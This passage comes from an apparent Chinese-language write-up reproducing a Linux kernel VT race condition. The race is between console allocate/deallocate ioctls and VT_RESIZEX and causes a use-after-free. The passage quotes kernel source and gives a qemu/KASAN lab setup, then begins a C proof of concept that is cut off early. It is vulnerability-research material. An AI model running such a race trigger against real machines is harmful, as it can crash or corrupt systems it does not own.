        if (vc_cons_allocated(currcons)) {
            struct vt_notifier_param param;
            param.vc = vc = vc_cons[currcons].d;
            atomic_notifier_call_chain(&vt_notifier_list, VT_DEALLOCATE, &param);
            vcs_remove_sysfs(currcons);
            visual_deinit(vc);
            put_pid(vc->vt_pid);
            vc_uniscr_set(vc, NULL);
            kfree(vc->vc_screenbuf);
            vc_cons[currcons].d = NULL;
        }
        return vc;
    }
**0x01 vt_disallocate（）函数**
如果arg不为0并且在合适的范围里面，则会调用vt_disallocate（）函数，vc_deallocate这个函数也是对vc_deallocate（）函数的一个包装，和vt_disallocate_all（）区别不大，就是从释放全部变成释放指定的索引
    static int vt_disallocate(unsigned int vc_num)
    {
        struct vc_data *vc = NULL;
        int ret = 0;
        console_lock();
        if (VT_BUSY(vc_num))
            ret = -EBUSY;
        else if (vc_num)
            vc = vc_deallocate(vc_num);
        console_unlock();
        if (vc && vc_num >= MIN_NR_CONSOLES) {
            tty_port_destroy(&vc->port);
            kfree(vc);
        }
        return ret;
    }
**0x01 VT_ACTIVATE**
找到了能释放的vc_cons的case，我们还得，找到能够分配vc_cons的case，而VT_ACTIVATE这个case正是我们需要的，（至于怎么找到的VT_ACTIVATE这个case，可以考虑用
**grep** 正则匹配，然后回溯到vt_ioctl()这个函数，我是手找的。。。。）
        case VT_ACTIVATE:
            if (!perm)
                return -EPERM;
            if (arg == 0 || arg > MAX_NR_CONSOLES)
                ret =  -ENXIO;
            else {
                arg--;
                console_lock();
                ret = vc_allocate(arg);
                console_unlock();
                if (ret)
                    break;
                set_console(arg);
            }
            break;
这个函数比较关键的就是调用了vc_allocate()函数，大概的逻辑就是如果vc_cons[currcons].d不为NULL就返回，如果为NULL就分配一个新的vc_cons[currcons].d
    int vc_allocate(unsigned int currcons)    /* return 0 on success */
    {
        struct vt_notifier_param param;
        struct vc_data *vc;
        WARN_CONSOLE_UNLOCKED();
        if (currcons >= MAX_NR_CONSOLES)
            return -ENXIO;
        if (vc_cons[currcons].d)
            return 0;
        /* due to the granularity of kmalloc, we waste some memory here */
        /* the alloc is done in two steps, to optimize the common situation
           of a 25x80 console (structsize=216, screenbuf_size=4000) */
        /* although the numbers above are not valid since long ago, the
           point is still up-to-date and the comment still has its value
           even if only as a historical artifact.  --mj, July 1998 */
        param.vc = vc = kzalloc(sizeof(struct vc_data), GFP_KERNEL);
        if (!vc)
            return -ENOMEM;
        vc_cons[currcons].d = vc;
        tty_port_init(&vc->port);
        INIT_WORK(&vc_cons[currcons].SAK_work, vc_SAK);
        visual_init(vc, currcons, 1);
        if (!*vc->vc_uni_pagedir_loc)
            con_set_default_unimap(vc);
        vc->vc_screenbuf = kzalloc(vc->vc_screenbuf_size, GFP_KERNEL);
        if (!vc->vc_screenbuf)
            goto err_free;
        /* If no drivers have overridden us and the user didn't pass a
           boot option, default to displaying the cursor */
        if (global_cursor_default == -1)
            global_cursor_default = 1;
        vc_init(vc, vc->vc_rows, vc->vc_cols, 1);
        vcs_make_sysfs(currcons);
        atomic_notifier_call_chain(&vt_notifier_list, VT_ALLOCATE, &param);
        return 0;
    err_free:
        visual_deinit(vc);
        kfree(vc);
        vc_cons[currcons].d = NULL;
        return -ENOMEM;
    }
###  0x02 触发漏洞思路
现在万事具备了，现在就是要考虑怎么去触发条件竞争，我的思路是，开两个进程，一个进程不停的分配vc_cons[currcons].d和释放vc_cons[currcons].d，另一进程不停的去做VT_RESIZEX的调用，从而触发漏洞
## 0x03 漏洞复现
###  0x00 内核编译
我选择是5.4.7内核，先下载源码，然后
    make menuconfig
在kernel hacking下的compile-time checks and compiler
options选中添加符号表，这样的话，调试的时候会舒服很多
又因为我们这个洞是空指针引用，导致uaf，所以并不会panic，所以，我们还得添加一些内存检测的机制kasan,还是在kernel
hacking里面的memory debugging，能选的全选上
###  0x01 镜像
镜像的话，我使用的
主要这个可以用ssh，就不能每写一次poc就得打包一次，还可以在镜像里面直接编译，比较方便，但是有一些坑。。。。
###  0x02 qemu启动命令
    alias kernel-5-4-7="qemu-system-x86_64 
      -kernel /home/pwnht/linux-5.4-rc7/arch/x86/boot/bzImage 
      -append "console=ttyS0 root=/dev/sda earlyprintk=serial nokaslr"
      -hdb /home/pwnht/image/stretch.img 
      -net user,hostfwd=tcp::10021-:22 -net nic 
      -enable-kvm 
      -nographic 
      -m 2G 
      -smp 2 
      -s 
      -pidfile vm.pid 
      2>&1 | tee vm.log "
我把qemu启动命令映射了一个比较短的命令，这样比较方便
###  0x03 gdb调试
自己调试的时候，建议关闭kaslr，这样的话，gdb可以正确的识别kernel的基地址，然后源码也能容易的加载上，我其实是想用gdb多线程调试，我自己手动调度线程，来实现百分之百成功的条件竞争，奈何linux
kernel有自己的时间调度函数，你刚到断点，就被时间回调函数回调了，然后不知道走到哪里了，所以只能运行poc看结果
###  0x04 运行poc
运行大概一秒钟就会 **Segmentation fault**
这个时候输入dmesg查看log
发现复现成功
## 0x04 完整poc
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define VT_DISALLOCATE    0x5608
    #define VT_RESIZEX      0x560A
    #define VT_ACTIVATE    0x5606
    #define    EBUSY        1
    struct vt_consize {
        unsigned short v_rows;    /* number of rows */
        unsigned short v_cols;    /* number of columns */
        unsigned short v_vlin;    /* number of pixel rows on screen */
        unsigned short v_clin;    /* number of pixel rows per character */
        unsigned short v_vcol;    /* number of pixel columns on screen */
        unsigned short v_ccol;    /* number of pixel columns per character */
    };
    int main(){
        int fd=open("/dev/tty10",O_RDONLY);
        if (fd 